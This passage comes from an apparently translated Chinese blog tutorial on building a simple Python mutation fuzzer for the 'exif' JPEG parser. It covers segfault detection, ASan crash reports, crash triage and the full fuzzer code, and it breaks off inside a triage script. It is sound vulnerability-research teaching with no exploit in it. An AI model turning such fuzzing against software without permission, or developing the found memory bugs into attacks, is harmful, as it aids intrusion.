class="hljs-number">0xA005</span> InteroperabilityIFDPointer        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">948</span> tag[<span class="hljs-number">23</span>] <span class="hljs-number">0xA20E</span> FocalPlaneXResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">3888000</span>/<span class="hljs-number">876</span> tag[<span class="hljs-number">24</span>] <span class="hljs-number">0xA20F</span> FocalPlaneYResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2592000</span>/<span class="hljs-number">583</span> tag[<span class="hljs-number">25</span>] <span class="hljs-number">0xA210</span> FocalPlaneResolutionUnit        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2</span> tag[<span class="hljs-number">26</span>] <span class="hljs-number">0xA401</span> CustomRendered        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">0</span> tag[<span class="hljs-number">27</span>] <span class="hljs-number">0xA402</span> ExposureMode        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span> tag[<span class="hljs-number">28</span>] <span class="hljs-number">0xA403</span> WhiteBalance        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">0</span> tag[<span class="hljs-number">29</span>] <span class="hljs-number">0xA406</span> SceneCaptureType        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">0</span> &#123;Interoperability IFD&#125; tags=<span class="hljs-number">2</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x0001</span> InteroperabilityIndex        type=<span class="hljs-number">2</span> count=<span class="hljs-number">4</span> val=[R98]tag[<span class="hljs-number">01</span>] <span class="hljs-number">0x0002</span> InteroperabilityVersion        type=<span class="hljs-number">7</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> &#123;GPS IFD&#125; tags=<span class="hljs-number">1</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x0000</span> GPSVersionID        type=<span class="hljs-number">1</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> &#123;<span class="hljs-number">1</span>ST IFD&#125; tags=<span class="hljs-number">6</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x0103</span> Compression        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">6</span> tag[<span class="hljs-number">01</span>] <span class="hljs-number">0x011A</span> XResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">72</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">02</span>] <span class="hljs-number">0x011B</span> YResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">72</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">03</span>] <span class="hljs-number">0x0128</span> ResolutionUnit        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2</span> tag[<span class="hljs-number">04</span>] <span class="hljs-number">0x0201</span> JPEGInterchangeFormat        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1090</span> tag[<span class="hljs-number">05</span>] <span class="hljs-number">0x0202</span> JPEGInterchangeFormatLength        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1378</span> <span class="hljs-number">0</span>th IFD : Model = [Canon EOS <span class="hljs-number">40</span>D]Exif IFD : DateTimeOriginal = [<span class="hljs-number">2008</span>:<span class="hljs-number">05</span>:<span class="hljs-number">30</span> <span class="hljs-number">15</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span>]</code></pre><p>我们可以看到这个程序解析出<code>tags</code>并说明与它们相关联的字节值，这正是我们想要找到的。</p><h3 id="Chasing-Segfaults"><a href="#Chasing-Segfaults" class="headerlink" title="Chasing Segfaults"></a>Chasing Segfaults</h3><p>理想情况下，我们将会喂给这个程序一些变异的数据，然后得到<code>segfault</code>，意味着我们已找到了<code>bug</code>。我遇到的问题是当我为了<code>Segmentation fault</code>消息监控<code>stdout</code>和<code>sterr</code>是，它从未出现，这是因为<code>Segmentation fault</code>消息是来自我们的命令行<code>shell</code>而不是二进制，这意味着<code>shell</code>收到一个<code>SIGSEGV</code>信号，并且会反馈打印这个信息。</p><p>我发现监控这个的有一种方法用<code>pexpect Python module</code>的<code>use()</code>方法和<code>pipes Python module</code>的<code>quote()</code>方法。</p><p>我们将加一个新的函数，这个将输入<code>counter</code>作为参数，这个参数为我们<code>fuzzer</code>迭代的轮数，另外一个参数是变异的数据，如果我们看到<code>Segmentation</code>在我们<code>run()</code>指令的输出里面，我们将把这个变异的数据写入文件并保存，这样我们就可以有让二进制<code>crash</code>的<code>JPEG</code>图片了。</p><p>让我们创建一个新的称为<code>crashes</code>文件夹，然后我们将在这里面保存<code>JPEGs</code>，这些导致<code>crashes</code>的图片将会以<code>crash.&lt;fuzzing iteration (counter)&gt;.jpg</code>的格式保存，所以如果这个<code>fuzzing</code>迭代了100次导致了<code>a crash</code>，我们应该会得到这样的文件：<code>/crashes/crash.100.jpg</code></p><p>我们将持续以保持每100次模糊测试迭代的计数打印到终端的同一行，我们的函数如下所示：</p><pre><code class="hljs python3">def exif(counter,data):    command &#x3D; &quot;exif mutated.jpg -verbose&quot;    out, returncode &#x3D; run(&quot;sh -c &quot; + quote(command), withexitstatus&#x3D;1)    if b&quot;Segmentation&quot; in out:    f &#x3D; open(&quot;crashes&#x2F;crash.&#123;&#125;.jpg&quot;.format(str(counter)), &quot;ab+&quot;)    f.write(data)    if counter % 100 &#x3D;&#x3D; 0:    print(counter, end&#x3D;&quot;\r&quot;)</code></pre><p>接下来，我们将在我们代码的最下面替换我们执行的<code>stub</code>以跑一个计数器，一旦我们达到了<code>1000</code>次迭代，我们就停止<code>fuzzing</code>，我们也将让我们的<code>fuzzer</code>随机选择一个我们变异的方法，所以它或使用位翻转或使用魔数，让我们运行它，然后在结束时检测我们的<code>crashes</code>文件夹。</p><p>当<code>fuzzer</code>结束后，你可以看到我们获得了大概<code>30</code>个<code>crashes</code>。</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~/crashes# lscrash<span class="hljs-number">.102</span>.jpg  crash<span class="hljs-number">.317</span>.jpg  crash<span class="hljs-number">.52</span>.jpg   crash<span class="hljs-number">.620</span>.jpg  crash<span class="hljs-number">.856</span>.jpgcrash<span class="hljs-number">.129</span>.jpg  crash<span class="hljs-number">.324</span>.jpg  crash<span class="hljs-number">.551</span>.jpg  crash<span class="hljs-number">.694</span>.jpg  crash<span class="hljs-number">.861</span>.jpgcrash<span class="hljs-number">.152</span>.jpg  crash<span class="hljs-number">.327</span>.jpg  crash<span class="hljs-number">.559</span>.jpg  crash<span class="hljs-number">.718</span>.jpg  crash<span class="hljs-number">.86</span>.jpgcrash<span class="hljs-number">.196</span>.jpg  crash<span class="hljs-number">.362</span>.jpg  crash<span class="hljs-number">.581</span>.jpg  crash<span class="hljs-number">.775</span>.jpg  crash<span class="hljs-number">.984</span>.jpgcrash<span class="hljs-number">.252</span>.jpg  crash<span class="hljs-number">.395</span>.jpg  crash<span class="hljs-number">.590</span>.jpg  crash<span class="hljs-number">.785</span>.jpg  crash<span class="hljs-number">.985</span>.jpgcrash<span class="hljs-number">.285</span>.jpg  crash<span class="hljs-number">.44</span>.jpg   crash<span class="hljs-number">.610</span>.jpg  crash<span class="hljs-number">.84</span>.jpg   crash<span class="hljs-number">.987</span>.jpg</code></pre><p>我们现在可以用一行快速的代码证实这个结果：<code>root@kali:~/crashes# for i in *.jpg; do exif &quot;$i&quot; -verbose &gt; /dev/null 2&gt;&amp;1; done</code> ，记住我们可以将<code>STDOUT</code>和<code>STDERR</code>都导向<code>/dev/null</code>，因为<code>Segmentation fault</code>是来自<code>shell</code>，而不是来自二进制文件。</p><p>我们跑上面这指令，以下为输出：</p><pre><code class="hljs properties"><span class="hljs-meta">root@kali</span>:<span class="hljs-string">~/crashes# for i in *.jpg; do exif &quot;$i&quot; -verbose &gt; /dev/null 2&gt;&amp;1; done</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">-----SNIP-----</span></code></pre><p>你不可以看到它们的所有，但是这里确实有30个<code>segfaults</code>，所以所有的事情都似乎按照计划的进行。</p><h2 id="Triaging-Crashes"><a href="#Triaging-Crashes" class="headerlink" title="Triaging Crashes"></a>Triaging Crashes</h2><p>现在我们有大约30个<code>crashes</code>和导致<code>crashes</code>的<code>JPEGs</code>，下一步是分析这些<code>crahes</code>并找出其中它们有多少是<code>unique</code>，在这里我们可以用一些我们看<code>Brandon Faulk</code>的视频学到的东西，用<code>Beyond Compare</code>快速看一遍<code>crash</code>的样本，我们发现大部分都是因为我们的<code>bit_flip()</code>变异而不是<code>magic()</code>变异方法产生的，这很有趣，作为测试，当我们运行的过程中，我们可以关闭函数选择的随机性，只使用<code>magic()</code>变异方式运行100000次迭代，再看看我们是否会遇到任何<code>crahes</code></p><h2 id="Using-ASan-to-Analyze-Crashes"><a href="#Using-ASan-to-Analyze-Crashes" class="headerlink" title="Using ASan to Analyze Crashes"></a>Using ASan to Analyze Crashes</h2><p><code>ASan</code>是<code>Address Sanitizer</code>，它是较新版本的<code>gcc</code>附带的有效工具，允许用户在编译二进制文件使用<code>-fsanitize=address</code>参数打开，并在发生内存访问错误时（即使是那些导致<code>crash</code>的时候）获得非常详细的信息，很显然，我们这里已经预选择了会崩溃的输入，所以我们错过该有效工具（笔者认为这里指的意思是在<code>fuzzing</code>的时候没有用<code>ASan</code>），但也许我们将会保存它在其他时间（使用）（笔者认为这里指的是在调<code>crash</code>的时候使用带<code>ASan</code>的编译后的二进制文件）。</p><p>为了使用 ASan，我跟着<a href="https://fuzzing-project.org/tutorial2.html">the Fuzzing Project</a>的思路，然后用如下<code>flags: cc -fsanitize=address -ggdb -o exifsan sample_main.c exif.c</code>重新编译了<code>exif</code> </p><p>然后为了方便使用我将<code>exifsan</code> 移动到<code>/usr/bin</code>，如果我们在<code>crash</code>样本上运行这个新编译的二进制文件，让我们看看输出吧</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~/crashes# exifsan crash<span class="hljs-number">.252</span>.jpg -verbosesystem: little-endian  data: little-endian===================================================================<span class="hljs-number">18831</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="hljs-number">0xb4d00758</span> at pc <span class="hljs-number">0x00415b9e</span> bp <span class="hljs-number">0xbf8c91f8</span> sp <span class="hljs-number">0xbf8c91ec</span>READ of size <span class="hljs-number">4</span> at <span class="hljs-number">0xb4d00758</span> thread T0                                                                                                  #<span class="hljs-number">0</span> <span class="hljs-number">0x415b9d</span> <span class="hljs-keyword">in</span> parseIFD /root/exif/exif.c:<span class="hljs-number">2356</span>    #<span class="hljs-number">1</span> <span class="hljs-number">0x408f10</span> <span class="hljs-keyword">in</span> createIfdTableArray /root/exif/exif.c:<span class="hljs-number">271</span>    #<span class="hljs-number">2</span> <span class="hljs-number">0x4076ba</span> <span class="hljs-keyword">in</span> main /root/exif/sample_main.c:<span class="hljs-number">63</span>    #<span class="hljs-number">3</span> <span class="hljs-number">0xb77d0ef0</span> <span class="hljs-keyword">in</span> __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span>    #<span class="hljs-number">4</span> <span class="hljs-number">0x407310</span> <span class="hljs-keyword">in</span> _start (/usr/bin/exifsan+<span class="hljs-number">0x2310</span>)<span class="hljs-number">0xb4d00758</span> <span class="hljs-keyword">is</span> located <span class="hljs-number">0</span> bytes to the right of <span class="hljs-number">8</span>-byte region [<span class="hljs-number">0xb4d00750</span>,<span class="hljs-number">0xb4d00758</span>)allocated by thread T0 here:                                                                                                            #<span class="hljs-number">0</span> <span class="hljs-number">0xb7aa2097</span> <span class="hljs-keyword">in</span> __interceptor_malloc (/lib/i386-linux-gnu/libasan.so<span class="hljs-number">.5</span>+<span class="hljs-number">0x10c097</span>)    #<span class="hljs-number">1</span> <span class="hljs-number">0x415a9f</span> <span class="hljs-keyword">in</span> parseIFD /root/exif/exif.c:<span class="hljs-number">2348</span>    #<span class="hljs-number">2</span> <span class="hljs-number">0x408f10</span> <span class="hljs-keyword">in</span> createIfdTableArray /root/exif/exif.c:<span class="hljs-number">271</span>    #<span class="hljs-number">3</span> <span class="hljs-number">0x4076ba</span> <span class="hljs-keyword">in</span> main /root/exif/sample_main.c:<span class="hljs-number">63</span>    #<span class="hljs-number">4</span> <span class="hljs-number">0xb77d0ef0</span> <span class="hljs-keyword">in</span> __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span>SUMMARY: AddressSanitizer: heap-buffer-overflow /root/exif/exif.c:<span class="hljs-number">2356</span> <span class="hljs-keyword">in</span> parseIFDShadow bytes around the buggy address:  <span class="hljs-number">0x369a0090</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a00a0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a00b0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a00c0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a00d0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa=&gt;<span class="hljs-number">0x369a00e0</span>: fa fa fa fa fa fa fa fa fa fa <span class="hljs-number">00</span>[fa]fa fa <span class="hljs-number">04</span> fa  <span class="hljs-number">0x369a00f0</span>: fa fa <span class="hljs-number">00</span> <span class="hljs-number">06</span> fa fa <span class="hljs-number">06</span> fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a0100</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a0110</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a0120</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a0130</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents <span class="hljs-number">8</span> application bytes):  Addressable:           <span class="hljs-number">00</span>  Partially addressable: <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">03</span> <span class="hljs-number">04</span> <span class="hljs-number">05</span> <span class="hljs-number">06</span> <span class="hljs-number">07</span>   Heap left redzone:       fa  Freed heap region:       fd  Stack left redzone:      f1  Stack mid redzone:       f2  Stack right redzone:     f3  Stack after <span class="hljs-keyword">return</span>:      f5  Stack use after scope:   f8  Global redzone:          f9  Global init order:       f6  Poisoned by user:        f7  Container overflow:      fc  Array cookie:            ac  Intra object redzone:    bb  ASan <span class="hljs-built_in">int</span>ernal:           fe  Left alloca redzone:     ca  Right alloca redzone:    cb  Shadow gap:              cc==<span class="hljs-number">18831</span>==ABORTING</code></pre><p>很不错，我们不仅可以获得详细信息，而且<code>ASan</code>还为我们区分了错误类别，告诉我们<code>crash</code>地址并提供一个很好的堆栈调用，正如你所见，我们在<code>exif.c</code>的<code>parseIFD </code>函数中执行了一个4字节的读操作。</p><pre><code class="hljs angelscript">READ of size <span class="hljs-number">4</span> at <span class="hljs-number">0xb4d00758</span> thread T0                                                                                                  #<span class="hljs-number">0</span> <span class="hljs-number">0x415b9d</span> <span class="hljs-keyword">in</span> parseIFD /root/exif/exif.c:<span class="hljs-number">2356</span>    #<span class="hljs-number">1</span> <span class="hljs-number">0x408f10</span> <span class="hljs-keyword">in</span> createIfdTableArray /root/exif/exif.c:<span class="hljs-number">271</span>    #<span class="hljs-number">2</span> <span class="hljs-number">0x4076ba</span> <span class="hljs-keyword">in</span> main /root/exif/sample_main.c:<span class="hljs-number">63</span>    #<span class="hljs-number">3</span> <span class="hljs-number">0xb77d0ef0</span> <span class="hljs-keyword">in</span> __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span>    #<span class="hljs-number">4</span> <span class="hljs-number">0x407310</span> <span class="hljs-keyword">in</span> _start (/usr/bin/exifsan+<span class="hljs-number">0x2310</span>)</code></pre><p>由于现在这都是标准二进制输出，我们实际上可以对这些<code>crash</code>进行分类并尝试理解它们，让我们首先尝试对<code>crash</code>进行冗余删除，有可能我们所有的30次崩溃都是同一个错误。也有可能我们有30次<code>unqiue crashes</code>（不太可能哈哈），所以我们需要解决这个问题。</p><p>让我们再次调用<code>Python</code>脚本，我们将遍历该文件夹，对每次<code>crash</code>运行启用<code>ASan</code>的二进制文件，并记录每个<code>crash</code>地址的位置，我们还将尝试捕获它是<code>READ</code>还是<code>WRITE</code>操作，例如，对于<code>crash.252.jpg</code>，我们将日志文件名字格式化为：<code>crash.252.HBO.b4f00758.READ</code>，并将<code>ASan</code>输出写入日志，这样我们甚至在打开日志之前就知道导致它的<code>crash</code>图片名、<code>bug</code>的类别、地址和操作。 （我会在最后贴检测和分类的脚本，太恶心了，我讨厌它）</p><p>在我们的<code>crashes</code>文件夹上运行检测和分类脚本后，我们现在可以看到我们已经分类了我们的<code>crashes</code>并且有一些非常有趣的东西。</p><pre><code class="hljs css"><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.102</span><span class="hljs-selector-class">.HBO</span><span class="hljs-selector-class">.b4f006d4</span><span class="hljs-selector-class">.READ</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.102</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.HBO</span><span class="hljs-selector-class">.b4f005dc</span><span class="hljs-selector-class">.READ</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.HBO</span><span class="hljs-selector-class">.b4f005dc</span><span class="hljs-selector-class">.READ</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.317</span><span class="hljs-selector-class">.HBO</span><span class="hljs-selector-class">.b4f005b4</span><span class="hljs-selector-class">.WRITE</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.317</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.285</span><span class="hljs-selector-class">.SEGV</span><span class="hljs-selector-class">.00000000</span><span class="hljs-selector-class">.READ</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.285</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">------SNIP-----</span></code></pre><p>在那里进行了一次大<code>SNIP</code>之后，在我的30次<code>crash</code>中，我只有一次<code>WRITE</code>操作。你无法从截断的输出中看到，但我也有很多<code>SEGV</code>错误因为<code>NULL</code>地址被引用了(0x00000000)</p><p>让我们检查一下我们修改后的<code>fuzzer</code>，它只运行了100000次迭代的<code>magic()</code>编译，看看它是否找到任何<code>bugs</code></p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~/crashes2# lscrash<span class="hljs-number">.10354</span>.jpg  crash<span class="hljs-number">.2104</span>.jpg   crash<span class="hljs-number">.3368</span>.jpg   crash<span class="hljs-number">.45581</span>.jpg  crash<span class="hljs-number">.64750</span>.jpg  crash<span class="hljs-number">.77850</span>.jpg  crash<span class="hljs-number">.86367</span>.jpg  crash<span class="hljs-number">.94036</span>.jpgcrash<span class="hljs-number">.12771</span>.jpg  crash<span class="hljs-number">.21126</span>.jpg  crash<span class="hljs-number">.35852</span>.jpg  crash<span class="hljs-number">.46757</span>.jpg  crash<span class="hljs-number">.64987</span>.jpg  crash<span class="hljs-number">.78452</span>.jpg  crash<span class="hljs-number">.86560</span>.jpg  crash<span class="hljs-number">.9435</span>.jpgcrash<span class="hljs-number">.13341</span>.jpg  crash<span class="hljs-number">.23547</span>.jpg  crash<span class="hljs-number">.39494</span>.jpg  crash<span class="hljs-number">.46809</span>.jpg  crash<span class="hljs-number">.66340</span>.jpg  crash<span class="hljs-number">.78860</span>.jpg  crash<span class="hljs-number">.88799</span>.jpg  crash<span class="hljs-number">.94770</span>.jpgcrash<span class="hljs-number">.14060</span>.jpg  crash<span class="hljs-number">.24492</span>.jpg  crash<span class="hljs-number">.40953</span>.jpg  crash<span class="hljs-number">.49520</span>.jpg  crash<span class="hljs-number">.6637</span>.jpg   crash<span class="hljs-number">.79019</span>.jpg  crash<span class="hljs-number">.89072</span>.jpg  crash<span class="hljs-number">.95438</span>.jpgcrash<span class="hljs-number">.14905</span>.jpg  crash<span class="hljs-number">.25070</span>.jpg  crash<span class="hljs-number">.41505</span>.jpg  crash<span class="hljs-number">.50723</span>.jpg  crash<span class="hljs-number">.66389</span>.jpg  crash<span class="hljs-number">.79824</span>.jpg  crash<span class="hljs-number">.89738</span>.jpg  crash<span class="hljs-number">.95525</span>.jpgcrash<span class="hljs-number">.18188</span>.jpg  crash<span class="hljs-number">.27783</span>.jpg  crash<span class="hljs-number">.41700</span>.jpg  crash<span class="hljs-number">.52051</span>.jpg  crash<span class="hljs-number">.6718</span>.jpg   crash<span class="hljs-number">.81206</span>.jpg  crash<span class="hljs-number">.90506</span>.jpg  crash<span class="hljs-number">.96746</span>.jpgcrash<span class="hljs-number">.18350</span>.jpg  crash<span class="hljs-number">.2990</span>.jpg   crash<span class="hljs-number">.43509</span>.jpg  crash<span class="hljs-number">.54074</span>.jpg  crash<span class="hljs-number">.68527</span>.jpg  crash<span class="hljs-number">.8126</span>.jpg   crash<span class="hljs-number">.90648</span>.jpg  crash<span class="hljs-number">.98727</span>.jpgcrash<span class="hljs-number">.19441</span>.jpg  crash<span class="hljs-number">.30599</span>.jpg  crash<span class="hljs-number">.43765</span>.jpg  crash<span class="hljs-number">.55183</span>.jpg  crash<span class="hljs-number">.6987</span>.jpg   crash<span class="hljs-number">.82472</span>.jpg  crash<span class="hljs-number">.90745</span>.jpg  crash<span class="hljs-number">.9969</span>.jpgcrash<span class="hljs-number">.19581</span>.jpg  crash<span class="hljs-number">.31243</span>.jpg  crash<span class="hljs-number">.43813</span>.jpg  crash<span class="hljs-number">.5857</span>.jpg   crash<span class="hljs-number">.70713</span>.jpg  crash<span class="hljs-number">.83282</span>.jpg  crash<span class="hljs-number">.92426</span>.jpgcrash<span class="hljs-number">.19907</span>.jpg  crash<span class="hljs-number">.31563</span>.jpg  crash<span class="hljs-number">.44974</span>.jpg  crash<span class="hljs-number">.59625</span>.jpg  crash<span class="hljs-number">.77590</span>.jpg  crash<span class="hljs-number">.83284</span>.jpg  crash<span class="hljs-number">.92775</span>.jpgcrash<span class="hljs-number">.2010</span>.jpg   crash<span class="hljs-number">.32642</span>.jpg  crash<span class="hljs-number">.4554</span>.jpg   crash<span class="hljs-number">.64255</span>.jpg  crash<span class="hljs-number">.77787</span>.jpg  crash<span class="hljs-number">.84766</span>.jpg  crash<span class="hljs-number">.92906</span>.jpg</code></pre><p>这有一堆<code>crashes</code></p><h2 id="Getting-Serious-Conclusion"><a href="#Getting-Serious-Conclusion" class="headerlink" title="Getting Serious, Conclusion"></a>Getting Serious, Conclusion</h2><p><code>fuzzer</code>可以进行很多优化，目前它真的很粗糙，只是为了演示非常基本的编译<code>fuzzing</code>，<code>bug</code>分类过程也是一团糟，感觉整个过程都很<code>hacky</code>，我想我需要看更多<code>@gamozolabs</code>的视频，也许下次我们进行模糊测试时，我们会尝试一个更难的目标，用<code>Rust</code>或<code>Go</code>等很酷的语言编写模糊测试，我们将会尝试真正改进分类过程/利用其中一个<code>bugs</code>！</p><p>感谢博文中提到的每个人，非常感谢</p><p>直到下一次！</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p><code>JPEGfuzz.py</code></p><pre><code class="hljs python3">#!&#x2F;usr&#x2F;bin&#x2F;env python3import sysimport randomfrom pexpect import runfrom pipes import quote# read bytes from our valid JPEG and return them in a mutable bytearray def get_bytes(filename):f &#x3D; open(filename, &quot;rb&quot;).read()return bytearray(f)def bit_flip(data):num_of_flips &#x3D; int((len(data) - 4) * .01)indexes &#x3D; range(4, (len(data) - 4))chosen_indexes &#x3D; []# iterate selecting indexes until we&#39;ve hit our num_of_flips numbercounter &#x3D; 0while counter &lt; num_of_flips:chosen_indexes.append(random.choice(indexes))counter +&#x3D; 1for x in chosen_indexes:current &#x3D; data[x]current &#x3D; (bin(current).replace(&quot;0b&quot;,&quot;&quot;))current &#x3D; &quot;0&quot; * (8 - len(current)) + currentindexes &#x3D; range(0,8)picked_index &#x3D; random.choice(indexes)new_number &#x3D; []# our new_number list now has all the digits, example: [&#39;1&#39;, &#39;0&#39;, &#39;1&#39;, &#39;0&#39;, &#39;1&#39;, &#39;0&#39;, &#39;1&#39;, &#39;0&#39;]for i in current:new_number.append(i)# if the number at our randomly selected index is a 1, make it a 0, and vice versaif new_number[picked_index] &#x3D;&#x3D; &quot;1&quot;:new_number[picked_index] &#x3D; &quot;0&quot;else:new_number[picked_index] &#x3D; &quot;1&quot;# create our new binary string of our bit-flipped numbercurrent &#x3D; &#39;&#39;for i in new_number:current +&#x3D; i# convert that string to an integercurrent &#x3D; int(current,2)# change the number in our byte array to our new number we just constructeddata[x] &#x3D; currentreturn datadef magic(data):magic_vals &#x3D; [(1, 255),(1, 255),(1, 127),(1, 0),(2, 255),(2, 0),(4, 255),(4, 0),(4, 128),(4, 64),(4, 127)]picked_magic &#x3D; random.choice(magic_vals)length &#x3D; len(data) - 8index &#x3D; range(0, length)picked_index &#x3D; random.choice(index)# here we are hardcoding all the byte overwrites for all of the tuples that begin (1, )if picked_magic[0] &#x3D;&#x3D; 1:if picked_magic[1] &#x3D;&#x3D; 255:# 0xFFdata[picked_index] &#x3D; 255elif picked_magic[1] &#x3D;&#x3D; 127:# 0x7Fdata[picked_index] &#x3D; 127elif picked_magic[1] &#x3D;&#x3D; 0:# 0x00data[picked_index] &#x3D; 0# here we are hardcoding all the byte overwrites for all of the tuples that begin (2, )elif picked_magic[0] &#x3D;&#x3D; 2:if picked_magic[1] &#x3D;&#x3D; 255:# 0xFFFFdata[picked_index] &#x3D; 255data[picked_index + 1] &#x3D; 255elif picked_magic[1] &#x3D;&#x3D; 0:# 0x0000data[picked_index] &#x3D; 0data[picked_index + 1] &#x3D; 0# here we are hardcoding all of the byte overwrites for all of the tuples that being (4, )elif picked_magic[0] &#x3D;&#x3D; 4:if picked_magic[1] &#x3D;&#x3D; 255:# 0xFFFFFFFFdata[picked_index] &#x3D; 255data[picked_index + 1] &#x3D; 255data[picked_index + 2] &#x3D; 255data[picked_index + 3] &#x3D; 255elif picked_magic[1] &#x3D;&#x3D; 0:# 0x00000000data[picked_index] &#x3D; 0data[picked_index + 1] &#x3D; 0data[picked_index + 2] &#x3D; 0data[picked_index + 3] &#x3D; 0elif picked_magic[1] &#x3D;&#x3D; 128:# 0x80000000data[picked_index] &#x3D; 128data[picked_index + 1] &#x3D; 0data[picked_index + 2] &#x3D; 0data[picked_index + 3] &#x3D; 0elif picked_magic[1] &#x3D;&#x3D; 64:# 0x40000000data[picked_index] &#x3D; 64data[picked_index + 1] &#x3D; 0data[picked_index + 2] &#x3D; 0data[picked_index + 3] &#x3D; 0elif picked_magic[1] &#x3D;&#x3D; 127:# 0x7FFFFFFFdata[picked_index] &#x3D; 127data[picked_index + 1] &#x3D; 255data[picked_index + 2] &#x3D; 255data[picked_index + 3] &#x3D; 255return data# create new jpg with mutated datadef create_new(data):f &#x3D; open(&quot;mutated.jpg&quot;, &quot;wb+&quot;)f.write(data)f.close()def exif(counter,data):    command &#x3D; &quot;exif mutated.jpg -verbose&quot;    out, returncode &#x3D; run(&quot;sh -c &quot; + quote(command), withexitstatus&#x3D;1)    if b&quot;Segmentation&quot; in out:    f &#x3D; open(&quot;crashes2&#x2F;crash.&#123;&#125;.jpg&quot;.format(str(counter)), &quot;ab+&quot;)    f.write(data)    if counter % 100 &#x3D;&#x3D; 0:    print(counter, end&#x3D;&quot;\r&quot;)if len(sys.argv) &lt; 2:print(&quot;Usage: JPEGfuzz.py &lt;valid_jpg&gt;&quot;)else:filename &#x3D; sys.argv[1]counter &#x3D; 0while counter &lt; 100000:data &#x3D; get_bytes(filename)functions &#x3D; [0, 1]picked_function &#x3D; random.choice(functions)if picked_function &#x3D;&#x3D; 0:mutated &#x3D; magic(data)create_new(mutated)exif(counter,mutated)else:mutated &#x3D; bit_flip(data)create_new(mutated)exif(counter,mutated)counter +&#x3D; 1</code></pre><p><code>triage.py</code></p><pre><code class="hljs python3">#!&#x2F;usr&#x2F;bin&#x2F;env python3import osfrom os import listdirdef get_files():files &#x3D; os.listdir(&quot;&#x2F;root&#x2F;crashes&#x2F;&quot;)return filesdef triage_files(files):for x in files:original_output &#x3D; os.popen(&quot;exifsan &quot; + x + &quot; -verbose 2&gt;&amp;1&quot;).read()output &#x3D; original_output# Getting crash reasoncrash &#x3D; &#39;&#39;if &quot;SEGV&quot; in output:crash &#x3D; &quot;SEGV&quot;elif &quot;heap-buffer-overflow&quot; in output:crash &#x3D; 